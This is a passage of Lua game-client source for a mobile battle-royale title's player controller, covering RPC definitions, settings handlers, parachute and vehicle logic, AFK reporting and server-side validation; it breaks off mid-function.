-- Independent entry: native module first, then in-game online startup.
local originalExport = (function()
local PlayerControllerBase = {
  ClientRPC = {},
  ServerRPC = {},
  MulticastRPC = {},
  LuaEventContainer = {
    "DoUITouchMoveEvent",
    "OnReceivePostLogin"
  }
}
PlayerControllerBase.ClientRPC.RPC_Client_MaliciousTeammateReceiveWarningTips = {Reliable = true}
PlayerControllerBase.ClientRPC.RPC_Client_MaliciousTeammateVictimReceiveTips = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Str,
    UEnums.EPropertyClass.Bool,
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ClientRPC.RPC_Client_PopupAFKWindow = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool,
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_PlaySpecifiedPetAnimation = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Bool,
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_SetGameReadyCountDown = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_SetAutoUseMelee = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_SetPetRandomAnimDisable = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ClientRPC.RPC_ClientHUDDisplayHitDamage = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.MulticastRPC.RPC_Multicast_OnCreateDecal = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ServerRPC.Server_GenericRPC = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Byte
    }
  }
}
PlayerControllerBase.ClientRPC.Client_GenericRPC = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Byte
    }
  }
}
local CDamageEvent = import("/Script/Engine.DamageEvent")
local PlaneCls = import("/Script/ShadowTrackerExtra.PlaneCharacter")
local ELifetimeCondition = import("ELifetimeCondition")
local UCharacterClass = import("/Script/ShadowTrackerExtra.STExtraBaseCharacter")
local UPlayerStateClass = import("/Script/Gameplay.UAEPlayerState")
local UGameplayStatics = import("GameplayStatics")
local UKismetSystemLibrary = import("KismetSystemLibrary")
local AKillerTracker = import("KillerTracker")
local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local UIMessageSystem = require("GameLua.GameCore.Main.UIMessageSystem")
local InputStateControl

function PlayerControllerBase:ctor(selfType)
  self.LastestViewPlayerKey = 0
  self.bEnterpriseGMMod = false
  self.bAvatarErrReport = false
  self._bIsTeammateExitTeamBeforeBoarding = false
  self.ZiplineUI = nil
  self._SuperData = nil
  self.IsPreparingEnterZipline = false
  self.CanModPlayActorVoiceFeature = true
  self.nInLeftSharedSkinTimes = 0
  self.nOutLeftSharedSkinTimes = 0
  self.nFriendLeftSharedSkinTimes = -1
  self.bPCInputSwitcher = true
  self.bIsShowingFollowEmoteUI = false
  self.bIsShowingMovableEmoteUI = false
  self.PetAnimationTimer = nil
  self.bForbidCustomChat = false
  self.bHasBeginPlay = false
  local SuperData = self:GetSuperData()
  SuperData.IsUse3DTouch = false
  SuperData.bTurnOnDrift = true
  self.bIsJoyStickShow = false
  self.bModWeaponSkinCooldowning = false
  self.SettingHandleList = {}
  self.bCanModPlayPetEmoteIgnoreLevel = false
end

function PlayerControllerBase:_PostConstruct()
  PlayerControllerBase.__super._PostConstruct(self)
  GameplayData.BindPlayerController(self.Object)
  UIMessageSystem.BindPlayerController(self.Object)
  if Client then
    self.bWatchTeammateIgnoreDying = true
    self:AddCommonEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_ENTER_PROTECT, function()
      self.bHasEnterBattleResult = true
    end, self)
    self:AddControlEvent(self, "OnAvatarInfoRep", self.ReportAvatarFlow, self)
    self:AddControlEvent(self, "OnPlayerControllerBattleBeginPlay", self.HandleBattleBeginPlay, self)
  else
    self:EnableNetUpdateGroupID(2)
    self:DisableNetUpdateGroupID(4)
  end
end

function PlayerControllerBase:OnDestroyed()
  self:Dispose()
  PlayerControllerBase.__super.OnDestroyed(self)
end

function PlayerControllerBase:HandleBattleBeginPlay()
  self.bHasBeginPlay = true
end

function PlayerControllerBase:CheckBattleHasBeginPlay()
  return self.bHasBeginPlay
end

function PlayerControllerBase:ReportAvatarFlow(ItemIDList, sObjectName, sAvatarType)
  if not Client then
    return
  end
  if self == nil or not slua.isValid(self.Object) then
    return
  end
  local RecommendHandler = require("client.slua.logic.download.recommend.logic_recommend_handler")
  if slua.isValid(ItemIDList) and RecommendHandler then
    for _, ItemID in pairs(ItemIDList) do
      RecommendHandler.AddBattleItem(ItemID)
    end
  end
end

function PlayerControllerBase:OnLuaRep_Pawn()
  if slua.isValid(self.Pawn) and Game:IsClassOf(self.Pawn, UCharacterClass) then
    GameplayData.BindPlayerCharacter(self.Pawn, true)
    local EParachuteState = import("EParachuteState")
    local ParachuteState = self.Pawn.ParachuteState
    if ParachuteState and ParachuteState == EParachuteState.PS_Opening and self.Pawn.SwitchCameraToParachuteOpening then
      self.Pawn:SwitchCameraToParachuteOpening()
    elseif ParachuteState and ParachuteState == EParachuteState.PS_FreeFall and self.Pawn.SwitchCameraToParachuteFalling then
      self.Pawn:SwitchCameraToParachuteFalling()
    end
  else
  end
end

function PlayerControllerBase:OnLuaRep_PlayerState()
  if slua.isValid(self.PlayerState) then
    if Game:IsClassOf(self.PlayerState, UPlayerStateClass) then
      GameplayData.BindPlayerState(self.PlayerState, true)
    end
  else
    GameplayData.BindPlayerState(nil, true)
  end
end

function PlayerControllerBase:OnLuaRep_STExtraBaseCharacter()
  GameplayData.BindPlayerCharacter(self.STExtraBaseCharacter, true)
end

function PlayerControllerBase:ReceiveBeginPlay()
  PlayerControllerBase.__super.ReceiveBeginPlay(self)
  if self:IsLocalPlayerController() then
    self:SetAlwaysHideTouchInterface(false)
    self:ShowTouchInterface(true)
    self.IsShowInputControl = true
    self:CastUIMsg("UIMsg_Show/HideSelf", "ingame")
    self.bCanGetTouchInput = true
    local SurviveHUD = self:GetHUD()
    if slua.isValid(SurviveHUD) then
      SurviveHUD.bShowCrosshair = true
    end
  end
  if Client then
    self.bDeviceSupportGyrSensor = Client.IsDeviceSupportGyrSensor()
    self:BindMotionEvent()
    self:AddSettingOptionEvent("FireMode", function(FireMode)
      local tlog_report_utils = require("client.slua.config.tlog.tlog_report_utils")
      tlog_report_utils.ReportTLogEvent(TLogEventDefine.CharacterControlMode, 2, string.format("ControlMode=%d", FireMode))
      self.fireMode = FireMode
      self:MakeFireModeEffect()
    end, true)
    self:AddSettingOptionEvent("WallFeedBack", function(WallFeedBack)
      self.WallFeedBack = WallFeedBack
    end, true)
    self:AddSettingOptionEvent("Weapon_LowAmmo", function(Weapon_LowAmmo)
      self.bLowAmmoSound = Weapon_LowAmmo
    end, true)
    self:AddSettingOptionEvent("JoystickSprintSensitity", function(Value)
      self.JoystickSprintSensitity = Value
    end, true)
    self:AddSettingOptionEvent("DriftMode", function()
      self:OnDriftModeChanged()
    end)
    self:AddGameTimer(0.1, false, function()
      if slua.isValid(self.Object) then
        local LogicCustomSensitivity = require("client.logic.setting.logic_setting_custom_sensitivity")
        local LogicCustomAccessories = require("client.logic.setting.logic_setting_custom_accessiores")
        LogicCustomSensitivity.Read()
        LogicCustomAccessories.Read()
        LogicCustomAccessories.SetPlayer()
      end
    end)
    self:ReadCustomDrawHairType()
    self:AddCommonEvent(EVENTTYPE_SETTING, EVENTID_SETTING_REFRESH_CROSSHAIR, self.ReadCustomDrawHairType, self)
    self:AddCommonEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_CLICKED, self.UseModSkin, self)
    self:AddCommonEvent(EVENTTYPE_INGAME_UI, EVENTID_QUICK_TWEAK_LAYOUT_STATE, function(_, __, bEnabled)
      self._DisableUITouchMove = bEnabled
    end)
    local SmartBearerManagerLuaBridge = import("SmartBearerManagerLuaBridge")
    if SmartBearerManagerLuaBridge ~= nil and SmartBearerManagerLuaBridge.IsLightLossyOptEnable() then
      self.bAsyncPlayItemOperationSound = true
    end
  end
  self:LuaReceiveBeginPlay()
  if not self:HasAuthority() then
    self.bWatchTeammateIgnoreDying = true
    local uGameInstance = UGameplayStatics.GetGameInstance(self)
    if slua.isValid(uGameInstance) then
      self:AddControlEvent(uGameInstance, "OnPreBattleResult", self.OnPreBattleResult, self)
    end
    self:AddControlEvent(self, "OnPlayerEnterFighting", self.HandlePlayerEnterFighting, self)
    self:AddControlEvent(self, "OnPlayerKilledOthersPlayer", self.HandleOnPlayerKilledOthersPlayer, self)
    self:AddControlEvent(self, "OnPlayerControllerStateChangedDelegate", self.HandlePlayerControllerStateChanged, self)
    self:AddControlEvent(self, "OnPlayerEnterFlying", self.OnPlayerEnterFlyingInLua, self)
    self:AddControlEvent(self, "OnShowFollowEmoteDelegate", self.HandleShowFollowEmoteUI, self)
    self:AddControlEvent(self, "OnTouchInterfaceChangedDelegate", self.HandleTouchInterfaceChanged, self)
    self:RegistSetting()
    self:HandleTouchInterfaceChanged()
    if IsEditor then
      self.bPCInputSwitcher = true
    end
    local bDisableTouchOverEvent = USTExtraBlueprintFunctionLibrary.GetConsoleVariableIntValue("pc.DisableTouchOverEvent")
    if bDisableTouchOverEvent == 1 then
      self.bEnableTouchOverEvents = false
      self.bEnableTouchEvents = false
    end
    self:AddControlEvent(self, "OnSetViewTarget", self.HandleViewingTargetChanged, self)
    self:AddControlEvent(self, "OnSpectatorChange", self.HandleSpectatorChange, self)
  else
    self:AddControlEvent(self, "OnPlayerExitGameDelegate", self.HandlePlayerExitGame, self)
    local QuickSignComp = self:GetQuickSignComponent()
    if QuickSignComp and slua.isValid(QuickSignComp) then
      self:AddControlEvent(QuickSignComp, "OnDangerousQuickSignDelegate", self.OnDangerousQuickSignDelegate, self)
    else
    end
    self:CheckCanCustomChat()
    self:AddCommonEvent(EVENTTYPE_INGAME, EVENTID_CHECK_CAN_CUSTOM_CHAT, self.CheckCanCustomChat, self)
    self:AddCommonEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_CREATE_NEW_DECAL, self.OnCreateDecal, self)
    self:AddControlEvent(self, "OnSetObserveCharacter", self.HandleServerSpectatorChange, self)
    self:AddControlEvent(self, "OnPlayerRotationChanged", self.HandleOnPlayerRotationChanged, self)
    self:AddControlEvent(self, "OnPlayerCameraChanged", self.HandleOnPlayerCameraChanged, self)
    self:TryInitClientReplayDataReporter()
    self:AddCommonEvent(EVENTTYPE_INGAME_REPLAY, EVENTID_COMPLETE_PLAYBACK_START_RECORDING, self.OnCompletePlaybackStartRecord, self)
  end
  local bStandalone = UKismetSystemLibrary.IsStandalone(self)
  if self.bPCInputSwitcher and (bStandalone or not self:HasAuthority()) and not self:IsSpectator() and not self:IsObserver() then
    InputStateControl = require("GameLua.GameCore.Module.Input.InputStateControl")
    InputStateControl.Init()
  end
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_CONTROLLER_BEGINPLAY_FINISH)
  self.bUseNewMotionInput = true
  if Client then
    self:InitCameraData()
    self:OnDriftModeChanged()
    self:AddCommonEvent(EVENTTYPE_DATA_MGR, EVENTID_DATAMGR_UPDATE_NEWBIE_STATUS, self.OnDriftModeChanged, self)
  end
  self.bUseOldMethodForJoystickTriggerSprint = false
  local uLuaPatchRPCComponent = self:GetComponentByClass(import("/Script/slua_unreal.LuaPatchRPCComponent"))
  if slua.isValid(uLuaPatchRPCComponent) then
    uLuaPatchRPCComponent:SetIsReplicated(false)
  end
end

function PlayerControllerBase:OnCompletePlaybackStartRecord()
  local DelayTime = math.random(0, 1)
  self:AddGameTimer(DelayTime, false, function()
    self:TryInitClientReplayDataReporter()
  end)
  local FlushDelayTime = math.random(1, 10)
  self:AddGameTimer(FlushDelayTime, false, function()
    if not slua.isValid(self.Object) then
      return
    end
    if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.FlushDolphinIdToReplay then
      self.SpectatorComponent:FlushDolphinIdToReplay()
    end
  end)
end

function PlayerControllerBase:TryInitClientReplayDataReporter()
  if not slua.isValid(self.Object) then
    return
  end
  local uGameInstance = UGameplayStatics.GetGameInstance(self)
  if slua.isValid(uGameInstance) then
    local uCompletePlayBack = uGameInstance:GetCompletePlayback()
    if uCompletePlayBack and uCompletePlayBack:IsInRecordState() then
      self:InitClientReplayDataReporter()
    else
    end
  else
  end
end

function PlayerControllerBase:IsSuspiciousEarlyCloseParachute()
  if Client then
    return false
  end
  local EStateType = import("EStateType")
  if self:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
    return false
  end
  if self:GetLastStateType() ~= EStateType.State_ParachuteJump then
    return false
  end
  if self.bCanCloseParachute then
    return false
  end
  local Height = self.RealTimePawnHeight
  if not Height or Height <= 0 then
    local uCharacter = self:GetPlayerCharacterSafety()
    if not slua.isValid(uCharacter) then
      return false
    end
    local StartLoc = uCharacter:K2_GetActorLocation()
    local GroundLoc = Game:GetGroundLocation(StartLoc, -200000)
    if not GroundLoc then
      return false
    end
    Height = StartLoc.Z - GroundLoc.Z
  end
  local Threshold = tonumber(self.CanCloseParachuteToFallingHight) or 0
  if Threshold <= 0 then
    return false
  end
  local bSuspicious = Height > Threshold
  return bSuspicious
end

function PlayerControllerBase:ServerCloseParachute()
  if self:IsSuspiciousEarlyCloseParachute() then
    return
  end
  self.Super:ServerCloseParachute()
end

function PlayerControllerBase:CanChangeStatePC(StateType)
  local CurrentState = self:GetCurrentStateType()
  if CurrentState ~= StateType or self:IsSpectator() then
    return true
  end
  return false
end

function PlayerControllerBase:OnDriftModeChanged()
  local SuperData = self:GetSuperData()
  if not SuperData then
    return
  end
  local Settingconfig = slua_GameFrontendHUD:GetUserSettings()
  SuperData.bTurnOnDrift = Settingconfig.DriftMode > 0
  if SuperData.bTurnOnDrift then
    UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, "Drift.Enable 1")
  else
    UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, "Drift.Enable 0")
  end
end

function PlayerControllerBase:OldJoystickTriggerSprint(bIsSprint)
  self.IsJoystickTriggerSprint = bIsSprint
  self:BroadcastUIMessage("UIMsg_JoyStickTriggerSprint", 0, "", "")
end

function PlayerControllerBase:ReadCustomDrawHairType()
  local SettingModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.SettingModule)
  self.CustomCrossHairStype = SettingModule:GetOptionValue("CrossHairType")
end

function PlayerControllerBase:HandleChangeRolewearDone()
  if not Client then
    local uCurPawn = self:GetCurPawn()
    if uCurPawn then
      if uCurPawn.RefreshFollowState then
        uCurPawn:RefreshFollowState()
      end
      if slua.isValid(uCurPawn) and uCurPawn.IsCastingSkillIDFix and uCurPawn:IsCastingSkillIDFix(1014405) then
        uCurPawn:StopSkill(1014405)
      end
    end
  end
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_PLAYER_CHANGE_ROLE_WEAR_DONE, self.Object)
end

function PlayerControllerBase:HandleOnPlayerRotationChanged()
  local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
  if AFKReportorSubsystem then
    local Rotation = self:GetControlRotation()
    Rotation:ToString()
    if Rotation.Pitch == 0.0 and Rotation.Yaw == 90.0 and Rotation.Roll == 0.0 or Rotation:IsNearlyZero(0.001) then
    else
      AFKReportorSubsystem:PlayerHaveAction(self.UID)
    end
  else
  end
end

function PlayerControllerBase:HandleOnPlayerCameraChanged()
  local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
  if AFKReportorSubsystem then
    AFKReportorSubsystem:PlayerHaveAction(self.UID)
  else
  end
end

function PlayerControllerBase:OnPlayerEnterFlyingInLua()
  local ThePlane = self:GetThePlane()
  if ThePlane and slua.isValid(ThePlane) then
    local ViewTarget = self:GetViewTarget()
    if ViewTarget ~= ThePlane then
      self:SetViewTargetTest(ThePlane)
      if bWriteLog then
        tostring(ThePlane)
      end
    end
  end
  local PlayerCharacter = self:GetPlayerCharacterSafety()
  if slua.isValid(PlayerCharacter) then
    PlayerCharacter.MoveableSwitchPoseTime = 0
  end
end

function PlayerControllerBase:OnDangerousQuickSignDelegate(PlayerKey, SignLocation)
  local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
  if AFKReportorSubsystem then
    AFKReportorSubsystem:PlayerHaveAction(self.UID)
  else
  end
end

function PlayerControllerBase:HandlePlayerControllerStateChanged(ClientStateType)
  if self.bHasEnterBattleResult then
    return
  end
  local EStateType = import("EStateType")
  if ClientStateType == EStateType.State_InExPlane or ClientStateType == EStateType.State_InPlane then
    local LightCrossMgr = SubsystemMgr:Get("MapMarkLightCrossMgr")
    if LightCrossMgr then
      LightCrossMgr:ReviveInit()
    else
    end
    if ClientStateType == EStateType.State_InExPlane then
      local ENetRole = import("ENetRole")
      if self.Role == ENetRole.ROLE_AutonomousProxy and not self:IsSpectator() and not self:IsObserver() then
        local uPlayerCharacter = self:GetPlayerCharacterSafety()
        if uPlayerCharacter and slua.isValid(uPlayerCharacter) then
          uPlayerCharacter.MoveableSwitchPoseTime = 0
        end
      end
    end
    if ClientStateType == EStateType.State_InPlane then
      self:HandleShowFollowEmoteUI(false)
    end
  end
end

function PlayerControllerBase:ReceivePostLoginInit()
  if not self.bReconnecting then
    local AvatarDataUtil = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarDataUtil")
    AvatarDataUtil.GeneratePlayerAvatarData(self)
    self:InitWeaponAvatarItems()
    self:OnWeaponAvatarUpdate()
    self:InitGrenadeAvatarList(true)
    self:InitVehicleAvatarList()
    self:InitVehicleAdvanceAvatarList()
    self:InitVehicleMusicIDs()
  end
  if CGame and CGame:IsEditor() then
    local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
    local SecurtyEditorConfig = GamePlayTools.GetCurrentConfig("SecurtyEditorConfig")
    if SecurtyEditorConfig and SecurtyEditorConfig.GameSafeCallbacks then
      require(SecurtyEditorConfig.GameSafeCallbacks)
      if GameSafeCallbacks then
        GameSafeCallbacks.OnDSGlueHiaInit()
      end
    end
  end
  if UKismetSystemLibrary.IsDedicatedServer(self) and GameSafeCallbacks then
    GameSafeCallbacks.PostPlayerControllerLoginInit(self)
  end
  if UKismetSystemLibrary.IsDedicatedServer(self) then
    local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
    local PlayerInfo = PlayerDataMgr.GetPlayerInfo(self.UID)
    if PlayerInfo then
      self.bEnterpriseGMMod = PlayerInfo.bEnterpriseGMMod or false
      self.bAvatarErrReport = PlayerInfo.avatar_err_report or false
      if self.SecurityNotifyPCFeature then
        self.SecurityNotifyPCFeature:SyncBanInfo(PlayerInfo.ban)
      end
    end
    if slua.isValid(self.PlayerState) and self.PlayerState.InitTeamShowData then
      self.PlayerState:InitTeamShowData()
    end
    if slua.isValid(self.PlayerState) and self.PlayerState.ThemeTaskFeature then
      self.PlayerState.ThemeTaskFeature:InitTaskIDIPSwitch()
    end
    if slua.isValid(self.NetworkReportActor) then
      self.NetworkReportActor:ForceNetUpdate()
    end
  end
  self:CacheSyncParams()
  if slua.isValid(self.PlayerState) then
    if self.PlayerState.StoreFeature and self.PlayerState.StoreFeature.ReceivePostLoginInit then
      self.PlayerState.StoreFeature:ReceivePostLoginInit()
    end
    if self.PlayerState.ItemPickUpGuideFeature and self.PlayerState.ItemPickUpGuideFeature.ReceivePostLoginInit then
      self.PlayerState.ItemPickUpGuideFeature:ReceivePostLoginInit()
    end
  end
  if not Client then
    self:LuaBroadcast("OnReceivePostLogin", self)
  end
end

function PlayerControllerBase:GenerateKillBroadcastItemID(ClothAvatarID, PlayerUID)
  local XSuitAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitAvatarDataUtil")
  return XSuitAvatarDataUtil:GenerateKillBroadcastItemID(ClothAvatarID, PlayerUID)
end

function PlayerControllerBase:ReceiveEndPlay(EndPlayReason)
  self.ZiplineUI = nil
  self._SuperData = nil
  if not self:HasAuthority() then
    local VibrateUtilitySubsystem = SubsystemMgr:Get("VibrateUtilitySubsystem")
    if VibrateUtilitySubsystem and VibrateUtilitySubsystem.ResetVibrationData then
      VibrateUtilitySubsystem:ResetVibrationData()
    end
  end
  if Client then
    self.SettingHandleList = nil
  else
    local FatalDamageSubsystem = SubsystemMgr:Get("FatalDamageSubsystem")
    if FatalDamageSubsystem then
      FatalDamageSubsystem:ClearPlayerKillerFlow(self.UID)
    end
  end
  GameplayData.UnbindPlayerController(self.Object)
  if InputStateControl then
    InputStateControl.Destroy()
    InputStateControl = nil
  end
  self:ShowTouchInterface(false)
  self:ActivateTouchInterface(nil)
  PlayerControllerBase.__super.ReceiveEndPlay(self, EndPlayReason)
end

function PlayerControllerBase:GetLifetimeReplicatedProps()
  return {
    {
      "bEnterpriseGMMod",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    },
    {
      "bAvatarErrReport",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    },
    {
      "_bIsTeammateExitTeamBeforeBoarding",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    },
    {
      "nInLeftSharedSkinTimes",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Int
    },
    {
      "nOutLeftSharedSkinTimes",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Int
    },
    {
      "nFriendLeftSharedSkinTimes",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Int
    },
    {
      "bForbidCustomChat",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    }
  }
end

function PlayerControllerBase:CacheSyncParams()
  local uPlayerState = self.PlayerState
  if Client then
    return
  end
  if not slua.isValid(uPlayerState) then
    return
  end
  if not self.bReconnecting and uPlayerState.InitGeneralCounterFromServer then
    uPlayerState:InitGeneralCounterFromServer()
  else
  end
  local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
  local PlayerInfo = PlayerDataMgr.GetPlayerInfo(self.UID)
  if PlayerInfo then
    local Flag = PlayerInfo.suspicious_flag or 0
    if uPlayerState.SetSuspiciousFlag then
      uPlayerState:SetSuspiciousFlag(Flag)
    end
  else
  end
end

function PlayerControllerBase:OnRep_bEnterpriseGMMod()
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_ENTERPRISEGMMOD_CHANGE)
end

function PlayerControllerBase:IsEnterpriseGMMod()
  return self.bEnterpriseGMMod
end

function PlayerControllerBase:InitVehicleMusicIDs()
  return
end

function PlayerControllerBase:GetCommercialVehicle()
  local VehicleIDs = {}
  local Table = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
  if Table and Table.BornFall == 1 then
    table.insert(VehicleIDs, self.ShowVehicleSkin)
  end
  return VehicleIDs
end

function PlayerControllerBase:GetParachutingVehicleInfo()
  local VehicleInfo = {}
  if self:UseGlideParachute() then
    local glideId = self:GetCurWearTwoPersonAircraftID()
    if glideId and 0 < glideId then
      local Table = CDataTable.GetTableDataByFilter("TwoPersonAircraftConfig", "Glide", glideId)
      if Table then
        table.insert(VehicleInfo, {
          Table.ParachuteVehiclePath,
          Table.VehicleSkinID
        })
      end
    end
  else
    local Table = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
    if Table and Table.Parachute == 1 then
      table.insert(VehicleInfo, {
        Table.ParachuteVehicle,
        self.ShowVehicleSkin,
        self.VehiclePartData
      })
    end
  end
  return VehicleInfo
end

function PlayerControllerBase:UseGlideParachute()
  if self.EnterFlyingNum and self.EnterFlyingNum > 1 and self:IsGlideAfterReviveDSSwitchEnabled() == false then
    return true
  end
  local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
  local PlayerInfo2 = PlayerDataMgr.GetPlayerInfo(self.UID)
  if PlayerInfo2 and PlayerInfo2.glide == true then
    return true
  end
  local Table = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
  if not Table or Table.Parachute ~= 1 then
    return true
  end
  local GameMode = UGameplayStatics.GetGameMode(self)
  if slua.isValid(GameMode) then
    local GameState = GameMode.GameState
    if slua.isValid(GameState) then
      local Table = CDataTable.GetTableData("BTMode", GameState.GameModeID)
      if not Table or Table.EnableParachutingVehicle ~= true then
        return true
      end
    end
  end
  return false
end

function PlayerControllerBase:IsGlideAfterReviveDSSwitchEnabled()
  local Result = true
  if CGameState then
    local State = CGameState:GetGameModeState()
    if State == "FightingState" or State == "FinishedState" then
      local DSSwitch = Game:GetDSSwitchValue(65)
      if DSSwitch ~= "1" then
        Result = false
      end
    end
  end
  return Result
end

function PlayerControllerBase:OnPreBattleResult()
  self:FlushGameSettingFlow()
end

function PlayerControllerBase:FlushGameSettingFlow()
  local GameSetting = {}
  GameSetting.UID = 0
  if DataMgr and DataMgr.roleData then
    GameSetting.UID = DataMgr.roleData.uid
  end
  local BasicSetting = {}
  local UIUtil = require("client.common.ui_util")
  local uGameFrontendHUD = UIUtil.GetFirstGameFrontendHUD()
  if uGameFrontendHUD then
    local uSettingConfig = uGameFrontendHUD:GetUserSettings()
    if slua.isValid(uSettingConfig) then
      BasicSetting.ShoulderEnable = uSettingConfig.ShoulderEnable or false
      BasicSetting.ShoulderMode = uSettingConfig.ShoulderMode or 1
    end
  end
  GameSetting.BasicSetting = BasicSetting
  local ds_net = require("ds_net")
  ds_net.SendMessage("c2ds_ingame_flow_setting", GameSetting, GameSetting.UID)
end

function PlayerControllerBase:CallClientRPC(MsgName, MsgTable)
end

function PlayerControllerBase:RPCClientReceive(MsgID, Content)
end

function PlayerControllerBase:CallDSRPC(MsgName, MsgTable)
end

function PlayerControllerBase:RPCDSReceive(MsgID, Content)
end

function PlayerControllerBase:NotifyDeadBoxCollapsed(bCollapsed)
  if bCollapsed then
    EventSystem:postEvent(EVENTTYPE_DEADBOX_CLIENT, EVENTID_DEADBOX_OPENORCLOSEUI, false)
  end
end

function PlayerControllerBase:NotifyDeadBoxExpand()
  EventSystem:postEvent(EVENTTYPE_DEADBOX_CLIENT, EVENTID_DEADBOX_OPENORCLOSEUI, true)
end

function PlayerControllerBase:CanAutoSwitchGrenade(GrenadeID)
  local UBackpackUtils = import("BackpackUtils")
  local ret = 0 < GrenadeID and not UBackpackUtils.CheckItemSubType(GrenadeID, 601)
  return ret
end

PlayerControllerBase.ClientRPC.RPC_Client_MarkShoot = {
  Reliable = true,
  Params = {
    import("/Script/Engine.Actor"),
    import("/Script/Engine.Actor")
  }
}

function PlayerControllerBase:RPC_Client_MarkShoot(TargetPlayer, CauserPlayer)
  local HitMarkClient = SubsystemMgr:Get("HitMarkClientSubSystem")
  if HitMarkClient then
  end
end

PlayerControllerBase.ClientRPC.RPC_Client_WonderfulPeriod = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Float,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Float
    },
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Bool,
    {
      UEnums.EPropertyClass.Array,
      import("WonderfulSubTypeInfo")
    }
  }
}

function PlayerControllerBase:RPC_Client_WonderfulPeriod(nType, nStartTime, nEndTime, uAdditionalData, nPeriodIndex, nPeriodScore, bIsPureAI, SubTypeInfoList)
  local tNewPeriodInfo = {
    nType = nType,
    nStartTime = nStartTime,
    nEndTime = nEndTime,
    uAdditionalData = uAdditionalData,
    nPeriodIndex = nPeriodIndex,
    nPeriodScore = nPeriodScore,
    bIsPureAI = bIsPureAI,
    SubTypeInfoList = SubTypeInfoList
  }
  EventSystem:postEvent(EVENTTYPE_INGAME_REPLAY, EVENTID_PERIOD_UPDATE, tNewPeriodInfo)
end

PlayerControllerBase.ClientRPC.RPC_Client_PostTGPAIS = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Str
  }
}

function PlayerControllerBase:RPC_Client_PostTGPAIS(nKey, sValue)
  local TApmHelper = import("TApmHelper")
  if TApmHelper and TApmHelper.PostGameStatusToTGPAIS and nKey and sValue then
    TApmHelper.PostGameStatusToTGPAIS(nKey, sValue)
  end
end

function PlayerControllerBase:CanPickUpItem(DefineID)
  local EPickUpCheckResult = import("EPickUpCheckResult")
  if DefineID.Type == 1 then
    local uCurPawn = self:GetCurPawn()
    if slua.isValid(uCurPawn) and uCurPawn.GetWeaponManager ~= nil then
      local uWeaponMgr = uCurPawn:GetWeaponManager()
      if slua.isValid(uWeaponMgr) and not uWeaponMgr.bClientHasFinishedHandleSpawnWeapon then
        return EPickUpCheckResult.EPUFR_DelayAdd
      end
    end
  end
  return EPickUpCheckResult.EPUFR_OK
end

function PlayerControllerBase:DealWithPickUpFailed(DefineID)
  if CGameMode and slua.isValid(CGameMode.PlayerRespawnComponent) then
    CGameMode.PlayerRespawnComponent:PlayerDelayAddItem(self.PlayerKey, DefineID.TypeSpecificID)
  end
end

function PlayerControllerBase:OverrideAvatarInfo(tPlayerInfo)
end

function PlayerControllerBase:HandlePlayerEnterFighting()
